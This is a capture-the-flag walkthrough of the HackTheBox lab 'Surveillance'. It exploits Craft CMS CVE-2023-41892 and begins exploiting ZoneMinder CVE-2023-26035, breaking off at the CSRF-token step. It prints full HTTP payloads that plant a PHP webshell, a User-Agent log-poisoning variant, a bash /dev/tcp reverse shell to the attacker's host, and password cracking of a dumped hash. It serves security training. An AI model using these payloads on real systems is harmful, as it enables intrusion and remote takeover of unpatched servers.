HTB: Surveillance
=================

![Surveillance](https://0xdf.gitlab.io/img/surveillance-cover.png)

Surveillance is one of those challenges that has gotten significantly easier since it’s initial release. It features vulnerabilities that had descriptions but not public POCs at the time it was created, which made for an interesting challenge. It starts with an instance of Craft CMS. I’ll exploit an arbitrary object injection vulnerability to get RCE and a shell. I’ll find a password hash for another user in a database backup and crack it. That user can log into a ZoneMinder instance running on localhost, and I’ll exploit a vulnerability in it to get access as the zoneminder user. For root, I’ll show two ways to abuse the zoneminder user’s sudo privileges - through the ZoneMinder LD\_PRELOAD option, and via command injection in one of their scripts.

## Box Info

Name[Surveillance](https://www.hackthebox.com/machines/surveillance) [![Surveillance](https://0xdf.gitlab.io/icons/box-surveillance.png)](https://www.hackthebox.com/machines/surveillance)

[Play on HackTheBox](https://www.hackthebox.com/machines/surveillance)Release Date[09 Dec 2023](https://twitter.com/hackthebox_eu/status/1732771955105845628)Retire Date20 Apr 2024OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsMedium \[30\]Rated Difficulty![Rated difficulty for Surveillance](https://0xdf.gitlab.io/img/surveillance-diff.png)Radar Graph![Radar chart for Surveillance](https://0xdf.gitlab.io/img/surveillance-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)02:12:56 [![0xEnzuu](https://www.hackthebox.eu/badge/image/1450297)](https://app.hackthebox.com/users/1450297)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)03:22:30 [![jkr](https://www.hackthebox.eu/badge/image/77141)](https://app.hackthebox.com/users/77141)

Creators[![TheCyberGeek](https://www.hackthebox.eu/badge/image/114053)](https://app.hackthebox.com/users/114053)

[![TRX](https://www.hackthebox.eu/badge/image/31190)](https://app.hackthebox.com/users/31190)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.245
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-17 14:33 EDT
Nmap scan report for 10.10.11.245
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.245
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-17 14:35 EDT
Nmap scan report for 10.10.11.245
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

There’s a redirect on the webserver to `http://surveillance.htb`. I’ll fuzz with `ffuf` to look for any subdomain that respond differently, but not find any. I’ll add this to my `/etc/hosts` file.

### Website - TCP 80

#### Site

The site is for a home security company:

![image-20240417145155685](https://0xdf.gitlab.io/img/image-20240417145155685.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

All of the links lead to other places on the page. There is an email address at the bottom, `demo@surveillance.htb`.

#### Tech Stack

The bottom of the page says “Powered by Craft CMS”. [CraftCMS](https://craftcms.com/) is a content management system written in PHP (as can be determined looking at the project on [GitHub](https://github.com/craftcms/cms)). The index page also loads as `index.php`. The “Powered by” text has a link to the [version 4.4.14 branch](https://github.com/craftcms/cms/tree/4.4.14) on GitHub.

The HTTP response headers also show CraftCMS:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 17 Apr 2024 18:44:38 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: Craft CMS
Content-Length: 16230

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP. Unfortunately, once a minute or so has passed, everything starts returning 502 and 503:

```
oxdf@hacky$ feroxbuster -u http://surveillance.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://surveillance.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       63l      222w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://surveillance.htb/images => http://surveillance.htb/images/
301      GET        7l       12w      178c http://surveillance.htb/js => http://surveillance.htb/js/
301      GET        7l       12w      178c http://surveillance.htb/css => http://surveillance.htb/css/
301      GET        7l       12w      178c http://surveillance.htb/img => http://surveillance.htb/img/
302      GET        0l        0w        0c http://surveillance.htb/admin => http://surveillance.htb/admin/login
200      GET      475l     1185w    16230c http://surveillance.htb/
302      GET        0l        0w        0c http://surveillance.htb/logout => http://surveillance.htb/
200      GET        1l        0w        1c http://surveillance.htb/index
301      GET        7l       12w      178c http://surveillance.htb/fonts => http://surveillance.htb/fonts/
200      GET      475l     1185w    16230c http://surveillance.htb/index.php
404      GET        0l        0w        0c http://surveillance.htb/css/scripts
404      GET        0l        0w        0c http://surveillance.htb/css/templates
404      GET        0l        0w        0c http://surveillance.htb/css/bin
404      GET        0l        0w        0c http://surveillance.htb/css/tag
404      GET        0l        0w        0c http://surveillance.htb/css/contact
404      GET        0l        0w        0c http://surveillance.htb/css/test
502      GET        7l       12w      166c http://surveillance.htb/fonts/download
502      GET        7l       12w      166c http://surveillance.htb/fonts/user
502      GET        7l       12w      166c http://surveillance.htb/fonts/media
502      GET        7l       12w      166c http://surveillance.htb/fonts/password
...[snip]...

```

This behavior happens each time I run it. The only potentially interesting find is `/admin`, which loads a login page:

![image-20240417153353872](https://0xdf.gitlab.io/img/image-20240417153353872.png)

## Shell as www-data

### CVE-2023-41892

#### Identify

Searching for CVEs in CraftCMS, there’s an interesting 2023 one that was published a couple months before Surveillance was released:

![image-20240417173056794](https://0xdf.gitlab.io/img/image-20240417173056794.png)

#### Background

The [nist page](https://nvd.nist.gov/vuln/detail/CVE-2023-41892) doesn’t give a very good description:

> Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector. Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.

Give this seems like 4.4.14, it should be vulnerable. If I filter my search to look for things before 9 December 2023, I’ll find [this Qualys post](https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/) from 25 September. The vulnerability is a pre-authentication PHP object injection vulnerability that can lead to remote code execution!

The issue is that there is a PHP class that has a `beforeAction` method that allows an attacker to create an arbitrary PHP object.

> Craft CMS has a relatively small pre-auth attack surface like other content management systems. But the _\\craft\\controllers\\ConditionsController_ class has a _beforeAction_ method that may allow an attacker to create an arbitrary object.
>
> Craft CMS and its dependents’ code bases contain several tools that can invoke methods selectively, such as _\\GuzzleHttp\\Psr7\\FnStream_ or including arbitrary files. An attacker may inject some PHP code into the Craft CMS’s log file on successful exploitation.

It also includes the vulnerable code:

```
public function beforeAction($action): bool
{
   $baseConfig = Json::decodeIfJson($this->request->getBodyParam('config'));
   $config = $this->request->getBodyParam($baseConfig['name']);
   $newRuleType = ArrayHelper::remove($config, 'new-rule-type');
   $conditionsService = Craft::$app->getConditions();
   $this->_condition = $conditionsService->createCondition($config);
   Craft::configure($this->_condition, $baseConfig);

```

And this image as a POC:

![surveillance-MicrosoftTeams-image](https://0xdf.gitlab.io/img/surveillance-MicrosoftTeams-image-1713435488195-3.png)

Since Surveillance’s release, there are many POCs available on GitHub to pull off this exploit very easily. To capture the experience of trying to solve this around release time, I’ll focus on posts that were available then. I’ll also show a POC just for fun [at the end](#running-poc).

### Manual Exploitation

#### Verify POC

The first step is to confirm that this site is vulnerable, testing the given POC. It’s minorly annoying to type the POST body into Burp Repeater by hand, and typos will lead to 500 errors. But once I get it right:

![image-20240418063027165](https://0xdf.gitlab.io/img/image-20240418063027165.png)

I’ve been able to inject `phpinfo` into the page. That is proof of vulnerability.

In the PHP Info page there’s some useful data to collect. The document root for the webserver is `/var/www/html/craft/web`:

![image-20240418085026485](https://0xdf.gitlab.io/img/image-20240418085026485.png)

There’s also a full section on imagick (The ImageMagick [class](https://www.php.net/manual/en/book.imagick.php)):

![image-20240418085135487](https://0xdf.gitlab.io/img/image-20240418085135487.png)

#### Strategy

Turning this into remote code execution is very similar to the arbitrary object instantiation exploitation in [Intentions](https://0xdf.gitlab.io/2023/10/14/htb-intentions.html#rce-via-imagemagick), which was based on [this blog post](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). The exploit there is to upload a Magick Scripting Language (MSL) file, and then reference it with PHP’s ImageMagick to get arbitrary file write.

There’s two major differences here:

- I don’t have a handy file upload ability.
- Rather than passing an argument to a file that is to be passed to ImageMagick, I’m going to create an instance of ImageMagick Myself.

#### File Upload

PHP [stores all files](https://stackoverflow.com/questions/3817360/where-does-php-save-temporary-files-during-uploading) attached to a POST request in `upload_tmp_dir` (typically `/tmp`) while it processes the request. However, if I can crash PHP, then it is possible that it will miss that cleanup and leave the temporary files behind.

To do that manually in Burp Repeater is a bit intimidating, but doable. I’ll work in small steps. First, I’ll convert the POST request from a POST to form data by updating the `Content-Type` header to define a boundary and moving each argument into it’s own block (delimited by the `boundary` proceeded by two dashes):

```
POST /index.php HTTP/1.1
Host: surveillance.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: multipart/form-data; boundary=0xdf0xdf0xdf0xdf
Content-Length: 442

--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="action"

conditions/render
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="test[userCondition]"

craft\elements\conditions\users\UserCondition
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="config"

{"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
--0xdf0xdf0xdf0xdf

```

Sending this still returns the `phpinfo` output. I’ll add another block with a fake file:

```
Content-Disposition: form-data; name="fakefile"; filename="0xdf.txt"
Content-Type: text/plain

This is a test
--0xdf0xdf0xdf0xdf

```

Sending this still shows `phpinfo`, and the file is saved on disk for a fraction of a second, but then deleted.

The trick is to have ImageMagick crash before the file is cleaned up. I’ll replace the `GuzzleHttp` invocation with a reference to imagick and have it try to open a non-MSL file as an MSL file:

```
POST /index.php HTTP/1.1
Host: surveillance.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: multipart/form-data; boundary=0xdf0xdf0xdf0xdf
Content-Length: 545

--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="action"

conditions/render
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="test[userCondition]"

craft\elements\conditions\users\UserCondition
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="config"

{"name":"test[userCondition]","as xyz":{"class":"imagick","__construct()":{"files":"msl:/etc/hostname"}}}
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="fakefile"; filename="0xdf.txt"
Content-Type: text/plain

This is a test
--0xdf0xdf0xdf0xdf

```

This will crash ImageMagick and prevent PHP from cleaning up the files.

I don’t have a good way to see this on target. The cleanest thing to do would be to run a copy of CraftCMS locally. From a Beyond Root point of view, I can see this creates the file:

```
root@surveillance:/tmp# ls php*
php0CZhKw
root@surveillance:/tmp# cat php0CZhKw
This is a test

```

#### Write WebShell

Now that I can upload, I’ll use the same trick as Intentions to write a webshell using an MSL file:

```
POST /index.php HTTP/1.1
Host: surveillance.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: multipart/form-data; boundary=0xdf0xdf0xdf0xdf
Content-Length: 760

--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="action"

conditions/render
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="test[userCondition]"

craft\elements\conditions\users\UserCondition
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="config"

{"name":"test[userCondition]","as xyz":{"class":"imagick","__construct()":{"files":"msl:/etc/hostname"}}}
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="fakefile"; filename="0xdf.txt"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/craft/web/0xdf.php" />
</image>
--0xdf0xdf0xdf0xdf

```

The MSL file reads the static webshell text and writes it into the webroot identified [above](#verify-poc).

Now I need to invoke that MSL using imagick. I’ll send that file upload request to another Repeater window and make some changes:

- I’ll remove the file block.
- l use the same `vid` trick as in [Intentions](https://0xdf.gitlab.io/2023/10/14/htb-intentions.html#arbitrary-object-instantiation) to reference the MSL file using a wildcard:

```
POST /index.php HTTP/1.1
Host: surveillance.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: multipart/form-data; boundary=0xdf0xdf0xdf0xdf
Content-Length: 411

--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="action"

conditions/render
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="test[userCondition]"

craft\elements\conditions\users\UserCondition
--0xdf0xdf0xdf0xdf
Content-Disposition: form-data; name="config"

{"name":"test[userCondition]","as xyz":{"class":"imagick","__construct()":{"files":"vid:msl:/tmp/php*"}}}
--0xdf0xdf0xdf0xdf

```

This hangs for a second before returning 502 Bad Gateway.

But the webshell is in the web root:

```
oxdf@hacky$ curl http://surveillance.htb/0xdf.php?cmd=id
caption:uid=33(www-data) gid=33(www-data) groups=33(www-data)
 CAPTION 120x120 120x120+0+0 16-bit sRGB 2.250u 0:02.259

```

### Alternative Object Abuse

#### Strategy

The original author of the box took a slightly different path towards abusing the arbitrary object instantiation to solve the issue of getting a webshell following details in [this post](https://blog.calif.io/p/craftcms-rce) by the vulnerability’s discoverer:

- Poison the craft web logs with a PHP webshell in a `User-Agent` string.
- Include the file using the `yii` module’s `PhpManager` object.

After including the log, PHP will still crash on the request, not returning the results. Therefore, I’ll have PHP in the log create a webshell in the web root that can be used repeatedly.

#### Modify POC

Starting with the original POC, I’ll replace the `GuzzleHttp` class with `PhpManager`, using the `itemFile` to show what file to include. The log file location (which includes today’s date) is from the [CraftCMS documentation](https://craftcms.com/docs/4.x/logging.html). I’ll modify the `User-Agent` header to be some PHP to write a file in the web root.

```
POST /index.php HTTP/1.1
Host: surveillance.htb
User-Agent: <?php `echo test > /var/www/html/craft/web/0xdf.txt`;?>
Content-Type: application/x-www-form-urlencoded
Content-Length: 258

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/www/html/craft/storage/logs/web-2024-04-18.log"}]}}

```

On sending this twice (once to write the log and once to reference it), there’s a file in the web root:

```
oxdf@hacky$ curl http://surveillance.htb/0xdf.txt
test

```

Updating the `User-Agent` to write a PHP webshell instead of “test” is trivial.

### Running POC

Faelian has a really nice [POC for CVE-2203-41892](https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py) that is held in a single Python script. It follows the same steps I did manually using ImageMagick.

In [lines 32-62](https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py#L32-L62), it runs the POC to get `phpinfo` output, and gets the `tmp_dir` and `document_root` from it:

![image-20240418101456469](https://0xdf.gitlab.io/img/image-20240418101456469.png)

In [lines 64-81](https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py#L64-L81) it uploads the MSL file to `/tmp` by crashing `imagick` on `/etc/passwd`:

![image-20240418101544477](https://0xdf.gitlab.io/img/image-20240418101544477.png)

The comment about uploading “shell.php” isn’t really accurate, as it’s really uploading the MSL file to make “shell.php”.

In [lines 84-93](https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py#L84-L93) it uses `imagick` to to write (not so much move) the webshell:

![image-20240418101739697](https://0xdf.gitlab.io/img/image-20240418101739697.png)

The rest of the script is a loop to take in commands, pass them to the webshell, and print the result.

It works very nicely:

```
oxdf@hacky$ python craft-cms.py http://surveillance.htb
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done

[!] Enjoy your shell

> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

Through any of these methods I’ll get a webshell. To upgrade that to a reverse shell, I’ll pass a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to the webshell:

```
oxdf@hacky$ curl http://surveillance.htb/0xdf.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' -x http://127.0.0.1:8080

```

This hangs, but at listening `nc`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.245 48910
bash: cannot set terminal process group (1089): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web$

```

I’ll upgrade my shell using the [standard PTY trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@surveillance:~/html/craft/web$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@surveillance:~/html/craft/web$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@surveillance:~/html/craft/web$

```

## Shell as matthew

### Enumeration

#### Home Directories

There are two users with home directories in `/home`:

```
www-data@surveillance:/home$ ls
matthew  zoneminder

```

www-data doesn’t have access to either.

#### Website DB

There’s not much of interest in the website directory. [The docs](https://craftcms.com/docs/4.x/config/db.html) show there could be a `db.php` file in `config`, but there isn’t:

```
www-data@surveillance:~/html/craft$ ls config/
app.php  general.php  htmlpurifier  license.key  project  routes.php

```

It could also be in the `.env` file, which it is:

```
# Read about configuration, here:
# https://craftcms.com/docs/4.x/config/

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

# General settings (see config/general.php)
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/

```

I’ll connect:

```
www-data@surveillance:/home$ mysql -h 127.0.0.1 -ucraftuser -p'CraftCMSPassword2023!' craftdb
...[snip]...
MariaDB [craftdb]>

```

There’s a lot of tables, but `users` seems most interesting:

```
MariaDB [craftdb]> describe users;
+----------------------------+---------------------+------+-----+---------+-------+
| Field                      | Type                | Null | Key | Default | Extra |
+----------------------------+---------------------+------+-----+---------+-------+
| id                         | int(11)             | NO   | PRI | NULL    |       |
| photoId                    | int(11)             | YES  | MUL | NULL    |       |
| active                     | tinyint(1)          | NO   | MUL | 0       |       |
| pending                    | tinyint(1)          | NO   | MUL | 0       |       |
| locked                     | tinyint(1)          | NO   | MUL | 0       |       |
| suspended                  | tinyint(1)          | NO   | MUL | 0       |       |
| admin                      | tinyint(1)          | NO   |     | 0       |       |
| username                   | varchar(255)        | YES  | MUL | NULL    |       |
| fullName                   | varchar(255)        | YES  |     | NULL    |       |
| firstName                  | varchar(255)        | YES  |     | NULL    |       |
| lastName                   | varchar(255)        | YES  |     | NULL    |       |
| email                      | varchar(255)        | YES  | MUL | NULL    |       |
| password                   | varchar(255)        | YES  |     | NULL    |       |
| lastLoginDate              | datetime            | YES  |     | NULL    |       |
| lastLoginAttemptIp         | varchar(45)         | YES  |     | NULL    |       |
| invalidLoginWindowStart    | datetime            | YES  |     | NULL    |       |
| invalidLoginCount          | tinyint(3) unsigned | YES  |     | NULL    |       |
| lastInvalidLoginDate       | datetime            | YES  |     | NULL    |       |
| lockoutDate                | datetime            | YES  |     | NULL    |       |
| hasDashboard               | tinyint(1)          | NO   |     | 0       |       |
| verificationCode           | varchar(255)        | YES  | MUL | NULL    |       |
| verificationCodeIssuedDate | datetime            | YES  |     | NULL    |       |
| unverifiedEmail            | varchar(255)        | YES  |     | NULL    |       |
| passwordResetRequired      | tinyint(1)          | NO   |     | 0       |       |
| lastPasswordChangeDate     | datetime            | YES  |     | NULL    |       |
| dateCreated                | datetime            | NO   |     | NULL    |       |
| dateUpdated                | datetime            | NO   |     | NULL    |       |
+----------------------------+---------------------+------+-----+---------+-------+
27 rows in set (0.001 sec)

```

There’s only one row, for Matthew the admin:

```
MariaDB [craftdb]> select admin,username,fullName,email,password from users;
+-------+----------+-----------+------------------------+--------------------------------------------------------------+
| admin | username | fullName  | email                  | password                                                     |
+-------+----------+-----------+------------------------+--------------------------------------------------------------+
|     1 | admin    | Matthew B | admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe |
+-------+----------+-----------+------------------------+--------------------------------------------------------------+
1 row in set (0.001 sec)

```

That is a Blowfish hash. I’ll try to crack it with `hashcat` and `rockyou.txt`, but it’s very slow, and after 5 or so minutes when it has nothing, give up on that.

#### Website Files

Looking around at the filesystem structure of the CMS, there’s the `storage` directory where logs are kept:

```
www-data@surveillance:~/html/craft/storage$ ls
backups  config-deltas  logs  runtime

```

There is something in the `backups` dir:

```
www-data@surveillance:~/html/craft/storage$ ls backups/
surveillance--2023-10-17-202801--v4.4.14.sql.zip

```

I’ll `unzip` it and it’s quite long:

```
www-data@surveillance:~/html/craft/storage/backups$ unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip
Archive:  surveillance--2023-10-17-202801--v4.4.14.sql.zip
  inflating: surveillance--2023-10-17-202801--v4.4.14.sql
www-data@surveillance:~/html/craft/storage/backups$ wc -l surveillance--2023-10-17-202801--v4.4.14.sql
2293 surveillance--2023-10-17-202801--v4.4.14.sql

```

Towards the bottom is the `users` table:

```
--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820
aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-
10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;

```

Still only one user, but a different kind of hash, this time SHA256. I’ll save it to a file and pass it to `hashcat`:

```
$ hashcat ./admin-sha256.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
...[snip]...
The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

It can’t auto recognize the format. I’ll assume its the simplest one to start - SHA256 is fast to crack, and I can go back and try to research more if it doesn’t work.

```
$ hashcat ./admin-sha256.hash -m 1400 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
...[snip]...
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
...[snip]...

```

It completes in a matter os seconds.

### Shell

This password works with `su` and the matthew user on Surveillance:

```
www-data@surveillance:~$ su - matthew
Password:
matthew@surveillance:~$

```

It also works over SSH:

```
oxdf@hacky$ sshpass -p 'starcraft122490' ssh matthew@surveillance.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
...[snip]...
matthew@surveillance:~$

```

Either way, I can claim `user.txt`:

```
matthew@surveillance:~$ cat user.txt
263f2471************************

```

## Shell as zoneminder

### Enumeration

#### General

Matthew’s home directory is very empty:

```
matthew@surveillance:~$ ls -la
total 28
drwxrwx--- 3 matthew matthew 4096 Nov  9 12:45 .
drwxr-xr-x 4 root    root    4096 Oct 17  2023 ..
lrwxrwxrwx 1 matthew matthew    9 May 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 matthew matthew 3771 Apr 21  2023 .bashrc
drwx------ 2 matthew matthew 4096 Sep 19  2023 .cache
-rw-r--r-- 1 matthew matthew  807 Apr 21  2023 .profile
-rw-r----- 1 root    matthew   33 Apr 15 22:11 user.txt

```

There aren’t any interesting files owned by matthew, and the `/proc` filesystem is mounted with `hidepid=invisible`:

```
matthew@surveillance:~$ mount | grep ^proc
proc on /proc type proc (rw,relatime,hidepid=invisible)
matthew@surveillance:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
matthew    27812  0.0  0.2  17132  9576 ?        Ss   18:54   0:00 /lib/systemd/systemd --user
matthew    27919  0.0  0.1   8672  5488 pts/2    Ss   18:54   0:00 -bash
matthew    27928  0.0  0.1   8664  5368 pts/1    S+   18:55   0:00 -bash
matthew    28116  0.0  0.0  10108  3496 pts/2    R+   19:23   0:00 ps auxww

```

There is another service listening on TCP 8080:

```
matthew@surveillance:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

```

#### ZoneMinder

I’ll reconnect SSH using `-L 8888:localhost:8080` to tunnel anything hitting port 8888 on my host through the SSH session and to TCP 8080 on localhost of Surveillance.

Visiting `http://localhost:8888` shows a ZoneMinder login page:

![image-20240418161553529](https://0xdf.gitlab.io/img/image-20240418161553529.png)

[ZoneMinder](https://zoneminder.com/) is a free and [open source](https://github.com/ZoneMinder/zoneminder):

> Closed-circuit television software application developed for Linux which supports IP, USB and Analog cameras.

The username matthew / starcraft122490 doesn’t work to log in, but admin / starcraft122490 does!

![image-20240418161857080](https://0xdf.gitlab.io/img/image-20240418161857080.png)

This is version 1.36.32 according to the banner at the top right under “STOPPED”.

### CVE-2023-26035

#### Background

Searching for ZoneMinder vulnerabilities (again with a filter for things before 9 December 2023 when Surveillance released) reveals [CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035):

> Versions prior to 1.36.33 and 1.37.33 are vulnerable to Unauthenticated Remote Code Execution via Missing Authorization. There are no permissions check on the snapshot action, which expects an id to fetch an existing monitor but can be passed an object to create a new one instead. TriggerOn ends up calling shell\_exec using the supplied Id. This issue is fixed in This issue is fixed in versions 1.36.33 and 1.37.33.

Metasploit [added an exploit](https://www.rapid7.com/blog/post/2023/11/17/metasploit-weekly-wrap-up-36/) in November 2023.

#### Manual POC

To exploit this, I’ll need to get a CSRF token from the index page:

```
oxdf@hacky$ curl localhost:8888 -s | grep input | grep csrf_magic
                <form class="center-block" name="loginForm" id="loginForm" method="post" action="?view=login"><input type='hidden' name='__csrf_magic' value="key:827e7c381ce800986c8eaf05be675f1aaf2b048a,1713472410" />
oxdf@hacky$ curl localhost:8888 -s | grep input | grep csrf_magic | cut -d'"' -f12
